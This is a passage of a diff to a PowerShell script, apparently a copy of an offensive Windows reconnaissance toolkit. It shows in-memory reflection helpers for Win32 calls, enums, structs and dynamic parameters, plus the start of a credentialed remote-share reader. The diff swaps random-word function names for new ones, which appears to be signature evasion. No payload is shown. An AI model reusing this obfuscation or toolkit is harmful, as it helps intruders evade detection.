@@ -1,4 +1,4 @@
-function canonical {
+function spinoff {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [CmdletBinding()]
     Param (
@@ -7,18 +7,18 @@ function canonical {
         [String]
         $ModuleName = [Guid]::NewGuid().ToString()
     )
-    $FhjLiqqj99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
-    $CUtnSjht99 = $FhjLiqqj99.GetAssemblies()
-    foreach ($QJmZqOZR99 in $CUtnSjht99) {
-        if ($QJmZqOZR99.FullName -and ($QJmZqOZR99.FullName.Split(',')[0] -eq $ModuleName)) {
-            return $QJmZqOZR99
+    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
+    $LoadedAssemblies = $AppDomain.GetAssemblies()
+    foreach ($Assembly in $LoadedAssemblies) {
+        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
+            return $Assembly
         }
     }
-    $UoWCTUMT99 = New-Object Reflection.AssemblyName($ModuleName)
-    $SSNUOPgW99 = $FhjLiqqj99
-    $hHUiBMgN99 = $SSNUOPgW99.DefineDynamicAssembly($UoWCTUMT99, 'Run')
-    $jSuMtbYw99 = $hHUiBMgN99.DefineDynamicModule($ModuleName, $False)
-    return $jSuMtbYw99
+    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
+    $Domain = $AppDomain
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
+    return $ModuleBuilder
 }
 function func {
     Param (
@@ -41,23 +41,23 @@ function func {
         [Runtime.InteropServices.CharSet]
         $Charset,
         [String]
-        $SgFIMqQx99,
+        $EntryPoint,
         [Switch]
         $SetLastError
     )
-    $SdzJuWMG99 = @{
+    $Properties = @{
         DllName = $DllName
         FunctionName = $FunctionName
         ReturnType = $ReturnType
     }
-    if ($ParameterTypes) { $SdzJuWMG99['ParameterTypes'] = $ParameterTypes }
-    if ($NativeCallingConvention) { $SdzJuWMG99['NativeCallingConvention'] = $NativeCallingConvention }
-    if ($Charset) { $SdzJuWMG99['Charset'] = $Charset }
-    if ($SetLastError) { $SdzJuWMG99['SetLastError'] = $SetLastError }
-    if ($SgFIMqQx99) { $SdzJuWMG99['EntryPoint'] = $SgFIMqQx99 }
-    New-Object PSObject -Property $SdzJuWMG99
+    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
+    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
+    if ($Charset) { $Properties['Charset'] = $Charset }
+    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
+    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
+    New-Object PSObject -Property $Properties
 }
-function counterclaims
+function themselves
 {
     [OutputType([Hashtable])]
     Param(
@@ -69,7 +69,7 @@ function counterclaims
         $FunctionName,
         [Parameter(ValueFromPipelineByPropertyName=$True)]
         [String]
-        $SgFIMqQx99,
+        $EntryPoint,
         [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
         [Type]
         $ReturnType,
@@ -94,7 +94,7 @@ function counterclaims
     )
     BEGIN
     {
-        $ryhnBXdu99 = @{}
+        $TypeHash = @{}
     }
     PROCESS
     {
@@ -102,77 +102,77 @@ function counterclaims
         {
             if ($Namespace)
             {
-                $ryhnBXdu99[$DllName] = $Module.GetType("$Namespace.$DllName")
+                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
             }
             else
             {
-                $ryhnBXdu99[$DllName] = $Module.GetType($DllName)
+                $TypeHash[$DllName] = $Module.GetType($DllName)
             }
         }
         else
         {
-            if (!$ryhnBXdu99.ContainsKey($DllName))
+            if (!$TypeHash.ContainsKey($DllName))
             {
                 if ($Namespace)
                 {
-                    $ryhnBXdu99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
+                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                 }
                 else
                 {
-                    $ryhnBXdu99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
+                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                 }
             }
-            $AlrHOHqQ99 = $ryhnBXdu99[$DllName].DefineMethod(
+            $Method = $TypeHash[$DllName].DefineMethod(
                 $FunctionName,
                 'Public,Static,PinvokeImpl',
                 $ReturnType,
                 $ParameterTypes)
             $i = 1
-            foreach($mVytBKxB99 in $ParameterTypes)
+            foreach($Parameter in $ParameterTypes)
             {
-                if ($mVytBKxB99.IsByRef)
+                if ($Parameter.IsByRef)
                 {
-                    [void] $AlrHOHqQ99.DefineParameter($i, 'Out', $null)
+                    [void] $Method.DefineParameter($i, 'Out', $null)
                 }
                 $i++
             }
-            $nvINoPdb99 = [Runtime.InteropServices.DllImportAttribute]
-            $xsqmBggZ99 = $nvINoPdb99.GetField('SetLastError')
-            $gGhsUUIw99 = $nvINoPdb99.GetField('CallingConvention')
-            $SYIQdhvU99 = $nvINoPdb99.GetField('CharSet')
-            $TIZWcqsI99 = $nvINoPdb99.GetField('EntryPoint')
-            if ($SetLastError) { $QtgjDipF99 = $True } else { $QtgjDipF99 = $False }
-            if ($PSBoundParameters['EntryPoint']) { $GyISvYGz99 = $SgFIMqQx99 } else { $GyISvYGz99 = $FunctionName }
+            $DllImport = [Runtime.InteropServices.DllImportAttribute]
+            $SetLastErrorField = $DllImport.GetField('SetLastError')
+            $CallingConventionField = $DllImport.GetField('CallingConvention')
+            $CharsetField = $DllImport.GetField('CharSet')
+            $EntryPointField = $DllImport.GetField('EntryPoint')
+            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
+            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
             $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
-            $RyXUyIDU99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
+            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                 $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
-                [Reflection.FieldInfo[]] @($xsqmBggZ99,
-                                           $gGhsUUIw99,
-                                           $SYIQdhvU99,
-                                           $TIZWcqsI99),
-                [Object[]] @($QtgjDipF99,
+                [Reflection.FieldInfo[]] @($SetLastErrorField,
+                                           $CallingConventionField,
+                                           $CharsetField,
+                                           $EntryPointField),
+                [Object[]] @($SLEValue,
                              ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                              ([Runtime.InteropServices.CharSet] $Charset),
-                             $GyISvYGz99))
-            $AlrHOHqQ99.SetCustomAttribute($RyXUyIDU99)
+                             $ExportedFuncName))
+            $Method.SetCustomAttribute($DllImportAttribute)
         }
     }
     END
     {
         if ($Module -is [Reflection.Assembly])
         {
-            return $ryhnBXdu99
+            return $TypeHash
         }
-        $prMvrceJ99 = @{}
-        foreach ($Key in $ryhnBXdu99.Keys)
+        $ReturnTypes = @{}
+        foreach ($Key in $TypeHash.Keys)
         {
-            $Type = $ryhnBXdu99[$Key].CreateType()
-            $prMvrceJ99[$Key] = $Type
+            $Type = $TypeHash[$Key].CreateType()
+            $ReturnTypes[$Key] = $Type
         }
-        return $prMvrceJ99
+        return $ReturnTypes
     }
 }
-function chivalrous {
+function pilgrimage {
     [OutputType([Type])]
     Param (
         [Parameter(Position = 0, Mandatory=$True)]
@@ -181,57 +181,57 @@ function chivalrous {
         [Parameter(Position = 1, Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $RCBBjquw99,
+        $FullName,
         [Parameter(Position = 2, Mandatory=$True)]
         [Type]
         $Type,
         [Parameter(Position = 3, Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
         [Hashtable]
-        $bRaENIbz99,
+        $EnumElements,
         [Switch]
         $Bitfield
     )
     if ($Module -is [Reflection.Assembly])
     {
-        return ($Module.GetType($RCBBjquw99))
+        return ($Module.GetType($FullName))
     }
-    $YVBUAqYi99 = $Type -as [Type]
-    $OZZBTKdI99 = $Module.DefineEnum($RCBBjquw99, 'Public', $YVBUAqYi99)
+    $EnumType = $Type -as [Type]
+    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
     if ($Bitfield)
     {
-        $NcHaOgaF99 = [FlagsAttribute].GetConstructor(@())
-        $vFXGMtPi99 = New-Object Reflection.Emit.CustomAttributeBuilder($NcHaOgaF99, @())
-        $OZZBTKdI99.SetCustomAttribute($vFXGMtPi99)
+        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
+        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
+        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
     }
-    foreach ($Key in $bRaENIbz99.Keys)
+    foreach ($Key in $EnumElements.Keys)
     {
-        $null = $OZZBTKdI99.DefineLiteral($Key, $bRaENIbz99[$Key] -as $YVBUAqYi99)
+        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
     }
-    $OZZBTKdI99.CreateType()
+    $EnumBuilder.CreateType()
 }
 function field {
     Param (
         [Parameter(Position = 0, Mandatory=$True)]
         [UInt16]
-        $gDiRAnjo99,
+        $Position,
         [Parameter(Position = 1, Mandatory=$True)]
         [Type]
         $Type,
         [Parameter(Position = 2)]
         [UInt16]
-        $KUsFrgdb99,
+        $Offset,
         [Object[]]
         $MarshalAs
     )
     @{
-        Position = $gDiRAnjo99
+        Position = $Position
         Type = $Type -as [Type]
-        Offset = $KUsFrgdb99
+        Offset = $Offset
         MarshalAs = $MarshalAs
     }
 }
-function preconceives
+function changeable
 {
     [OutputType([Type])]
     Param (
@@ -241,95 +241,95 @@ function preconceives
         [Parameter(Position = 2, Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $RCBBjquw99,
+        $FullName,
         [Parameter(Position = 3, Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
         [Hashtable]
-        $ucgENMYV99,
+        $StructFields,
         [Reflection.Emit.PackingSize]
-        $OCUGjAvm99 = [Reflection.Emit.PackingSize]::Unspecified,
+        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
         [Switch]
-        $gEaJdAAN99
+        $ExplicitLayout
     )
     if ($Module -is [Reflection.Assembly])
     {
-        return ($Module.GetType($RCBBjquw99))
+        return ($Module.GetType($FullName))
     }
-    [Reflection.TypeAttributes] $KTqKdAGH99 = 'AnsiClass,
+    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
         Class,
         Public,
         Sealed,
         BeforeFieldInit'
-    if ($gEaJdAAN99)
+    if ($ExplicitLayout)
     {
-        $KTqKdAGH99 = $KTqKdAGH99 -bor [Reflection.TypeAttributes]::ExplicitLayout
+        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
     }
     else
     {
-        $KTqKdAGH99 = $KTqKdAGH99 -bor [Reflection.TypeAttributes]::SequentialLayout
+        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
     }
-    $GvcZSPvg99 = $Module.DefineType($RCBBjquw99, $KTqKdAGH99, [ValueType], $OCUGjAvm99)
-    $vWlqahGu99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
-    $AxUuSzHn99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
-    $LEsrLeEZ99 = New-Object Hashtable[]($ucgENMYV99.Count)
-    foreach ($Field in $ucgENMYV99.Keys)
+    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
+    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+    $Fields = New-Object Hashtable[]($StructFields.Count)
+    foreach ($Field in $StructFields.Keys)
     {
-        $Index = $ucgENMYV99[$Field]['Position']
-        $LEsrLeEZ99[$Index] = @{FieldName = $Field; Properties = $ucgENMYV99[$Field]}
+        $Index = $StructFields[$Field]['Position']
+        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
     }
-    foreach ($Field in $LEsrLeEZ99)
+    foreach ($Field in $Fields)
     {
-        $rxipcHwl99 = $Field['FieldName']
-        $qVyaCXMv99 = $Field['Properties']
-        $KUsFrgdb99 = $qVyaCXMv99['Offset']
-        $Type = $qVyaCXMv99['Type']
-        $MarshalAs = $qVyaCXMv99['MarshalAs']
-        $ECwzlcIP99 = $GvcZSPvg99.DefineField($rxipcHwl99, $Type, 'Public')
+        $FieldName = $Field['FieldName']
+        $FieldProp = $Field['Properties']
+        $Offset = $FieldProp['Offset']
+        $Type = $FieldProp['Type']
+        $MarshalAs = $FieldProp['MarshalAs']
+        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
         if ($MarshalAs)
         {
-            $xjwCSwEQ99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
+            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
             if ($MarshalAs[1])
             {
                 $Size = $MarshalAs[1]
-                $kKTqVuxe99 = New-Object Reflection.Emit.CustomAttributeBuilder($vWlqahGu99,
-                    $xjwCSwEQ99, $AxUuSzHn99, @($Size))
+                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
+                    $UnmanagedType, $SizeConst, @($Size))
             }
             else
             {
-                $kKTqVuxe99 = New-Object Reflection.Emit.CustomAttributeBuilder($vWlqahGu99, [Object[]] @($xjwCSwEQ99))
+                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
             }
-            $ECwzlcIP99.SetCustomAttribute($kKTqVuxe99)
+            $NewField.SetCustomAttribute($AttribBuilder)
         }
-        if ($gEaJdAAN99) { $ECwzlcIP99.SetOffset($KUsFrgdb99) }
+        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
     }
-    $tCHJmAVJ99 = $GvcZSPvg99.DefineMethod('GetSize',
+    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
         'Public, Static',
         [Int],
         [Type[]] @())
-    $NBWyaQKe99 = $tCHJmAVJ99.GetILGenerator()
-    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $GvcZSPvg99)
-    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Call,
+    $ILGenerator = $SizeMethod.GetILGenerator()
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
         [Type].GetMethod('GetTypeFromHandle'))
-    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Call,
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
         [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
-    $NBWyaQKe99.Emit([Reflection.Emit.OpCodes]::Ret)
-    $FZWpBQWS99 = $GvcZSPvg99.DefineMethod('op_Implicit',
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
+    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
         'PrivateScope, Public, Static, HideBySig, SpecialName',
-        $GvcZSPvg99,
+        $StructBuilder,
         [Type[]] @([IntPtr]))
-    $pKSQITvS99 = $FZWpBQWS99.GetILGenerator()
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Nop)
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $GvcZSPvg99)
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Call,
+    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
         [Type].GetMethod('GetTypeFromHandle'))
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Call,
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
         [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $GvcZSPvg99)
-    $pKSQITvS99.Emit([Reflection.Emit.OpCodes]::Ret)
-    $GvcZSPvg99.CreateType()
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
+    $StructBuilder.CreateType()
 }
-Function coup {
+Function footnotes {
     [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
     Param (
         [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
@@ -340,49 +340,49 @@ Function coup {
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [string[]]$Alias,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$VmQSBvYC99,
+        [switch]$Mandatory,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [int]$gDiRAnjo99,
+        [int]$Position,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [string]$EiOAngBO99,
+        [string]$HelpMessage,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$Wtrsvzva99,
+        [switch]$DontShow,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$vQPazwpW99,
+        [switch]$ValueFromPipeline,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$ctUCkPvo99,
+        [switch]$ValueFromPipelineByPropertyName,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$SSRDycfc99,
+        [switch]$ValueFromRemainingArguments,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [string]$XLxkwcdg99 = '__AllParameterSets',
+        [string]$ParameterSetName = '__AllParameterSets',
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$dLwAPflL99,
+        [switch]$AllowNull,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$SAVhhNvT99,
+        [switch]$AllowEmptyString,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$xbTnEtGQ99,
+        [switch]$AllowEmptyCollection,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$ovWYUUul99,
+        [switch]$ValidateNotNull,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [switch]$nHuBGksM99,
-        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [ValidateCount(2,2)]
-        [int[]]$SKlYZFwl99,
+        [switch]$ValidateNotNullOrEmpty,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [ValidateCount(2,2)]
-        [int[]]$OBeQbHwo99,
+        [int[]]$ValidateCount,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [ValidateCount(2,2)]
-        [int[]]$EBVFqFLZ99,
+        [int[]]$ValidateRange,
+        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
+        [ValidateCount(2,2)]
+        [int[]]$ValidateLength,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [ValidateNotNullOrEmpty()]
-        [string]$GCBBUwzn99,
+        [string]$ValidatePattern,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [ValidateNotNullOrEmpty()]
-        [scriptblock]$ZWdKRRJx99,
+        [scriptblock]$ValidateScript,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [ValidateNotNullOrEmpty()]
-        [string[]]$kEthoKHP99,
+        [string[]]$ValidateSet,
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [ValidateNotNullOrEmpty()]
         [ValidateScript({
@@ -392,9 +392,9 @@ Function coup {
             }
             $true
         })]
-        $SvdEzdxg99 = $false,
+        $Dictionary = $false,
         [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
-        [switch]$dkXAXsIB99,
+        [switch]$CreateVariables,
         [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
         [ValidateNotNullOrEmpty()]
         [ValidateScript({
@@ -403,25 +403,25 @@ Function coup {
             }
             $true
         })]
-        $LRCAuYbY99
+        $BoundParameters
     )
     Begin {
-        $sqiXUsuv99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
+        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
         function _temp { [CmdletBinding()] Param() }
-        $VAoTSJIg99 = (Get-Command _temp).Parameters.Keys
+        $CommonParameters = (Get-Command _temp).Parameters.Keys
     }
     Process {
-        if($dkXAXsIB99) {
-            $zWOkOhkF99 = $LRCAuYbY99.Keys | Where-Object { $VAoTSJIg99 -notcontains $_ }
-            ForEach($mVytBKxB99 in $zWOkOhkF99) {
-                if ($mVytBKxB99) {
-                    Set-Variable -Name $mVytBKxB99 -Value $LRCAuYbY99.$mVytBKxB99 -Scope 1 -Force
+        if($CreateVariables) {
+            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }
+            ForEach($Parameter in $BoundKeys) {
+                if ($Parameter) {
+                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                 }
             }
         }
         else {
-            $qRSwIkvc99 = @()
-            $qRSwIkvc99 = $PSBoundParameters.GetEnumerator() |
+            $StaleKeys = @()
+            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                         ForEach-Object {
                             if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                 if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
@@ -434,35 +434,35 @@ Function coup {
                                 }
                             }
                         }
-            if($qRSwIkvc99) {
-                $qRSwIkvc99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
+            if($StaleKeys) {
+                $StaleKeys | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
             }
-            $whZFCFps99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
+            $UnboundParameters = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                         Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                             Select-Object -ExpandProperty Key |
                                                 Where-Object { $PSBoundParameters.Keys -notcontains $_ }
             $tmp = $null
-            ForEach ($mVytBKxB99 in $whZFCFps99) {
-                $wJdlYsHk99 = Get-Variable -Name $mVytBKxB99 -ValueOnly -Scope 0
-                if(!$PSBoundParameters.TryGetValue($mVytBKxB99, [ref]$tmp) -and $wJdlYsHk99) {
-                    $PSBoundParameters.$mVytBKxB99 = $wJdlYsHk99
+            ForEach ($Parameter in $UnboundParameters) {
+                $DefaultValue = Get-Variable -Name $Parameter -ValueOnly -Scope 0
+                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
+                    $PSBoundParameters.$Parameter = $DefaultValue
                 }
             }
-            if($SvdEzdxg99) {
-                $PXEKzCRf99 = $SvdEzdxg99
+            if($Dictionary) {
+                $DPDictionary = $Dictionary
             }
             else {
-                $PXEKzCRf99 = $sqiXUsuv99
+                $DPDictionary = $InternalDictionary
             }
-            $hkIwxndB99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}
-            $JPyCxUhp99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
-            $WFDXdRfx99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
-            $WMVhqxlR99 = '^Alias$'
-            $fRRbzpyY99 = New-Object -TypeName System.Management.Automation.ParameterAttribute
+            $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}
+            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
+            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
+            $AliasRegex = '^Alias$'
+            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute
             switch -regex ($PSBoundParameters.Keys) {
-                $JPyCxUhp99 {
+                $AttributeRegex {
                     Try {
-                        $fRRbzpyY99.$_ = . $hkIwxndB99
+                        $ParameterAttribute.$_ = . $GetVar
                     }
                     Catch {
                         $_
@@ -470,42 +470,42 @@ Function coup {
                     continue
                 }
             }
-            if($PXEKzCRf99.Keys -contains $Name) {
-                $PXEKzCRf99.$Name.Attributes.Add($fRRbzpyY99)
+            if($DPDictionary.Keys -contains $Name) {
+                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
             }
             else {
-                $JemltyPg99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
+                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                 switch -regex ($PSBoundParameters.Keys) {
-                    $WFDXdRfx99 {
+                    $ValidationRegex {
                         Try {
-                            $VuPCfVjR99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $hkIwxndB99) -ErrorAction Stop
-                            $JemltyPg99.Add($VuPCfVjR99)
+                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
+                            $AttributeCollection.Add($ParameterOptions)
                         }
                         Catch { $_ }
                         continue
                     }
-                    $WMVhqxlR99 {
+                    $AliasRegex {
                         Try {
-                            $TFCDKhvi99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $hkIwxndB99) -ErrorAction Stop
-                            $JemltyPg99.Add($TFCDKhvi99)
+                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
+                            $AttributeCollection.Add($ParameterAlias)
                             continue
                         }
                         Catch { $_ }
                     }
                 }
-                $JemltyPg99.Add($fRRbzpyY99)
-                $mVytBKxB99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $JemltyPg99)
-                $PXEKzCRf99.Add($Name, $mVytBKxB99)
+                $AttributeCollection.Add($ParameterAttribute)
+                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
+                $DPDictionary.Add($Name, $Parameter)
             }
         }
     }
     End {
-        if(!$dkXAXsIB99 -and !$SvdEzdxg99) {
-            $PXEKzCRf99
+        if(!$CreateVariables -and !$Dictionary) {
+            $DPDictionary
         }
     }
 }
-function intriguingly {
+function archers {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([Hashtable])]
     [CmdletBinding()]
@@ -517,85 +517,85 @@ function intriguingly {
         $Path,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
-        $sYroqMOX99
+        $OutputObject
     )
     BEGIN {
-        $nFPezvSf99 = @{}
+        $MappedComputers = @{}
     }
     PROCESS {
-        ForEach ($VfipJrPp99 in $Path) {
-            if (($VfipJrPp99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
-                $GVmMliRp99 = (New-Object System.Uri($VfipJrPp99)).Host
-                if (-not $nFPezvSf99[$GVmMliRp99]) {
-                    distinctively -ComputerName $GVmMliRp99 -Credential $gxazvivN99
-                    $nFPezvSf99[$GVmMliRp99] = $True
+        ForEach ($TargetPath in $Path) {
+            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
+                $HostComputer = (New-Object System.Uri($TargetPath)).Host
+                if (-not $MappedComputers[$HostComputer]) {
+                    depicting -ComputerName $HostComputer -Credential $Credential
+                    $MappedComputers[$HostComputer] = $True
                 }
             }
-            if (Test-Path -Path $VfipJrPp99) {
+            if (Test-Path -Path $TargetPath) {
                 if ($PSBoundParameters['OutputObject']) {
-                    $utpFPGej99 = New-Object PSObject
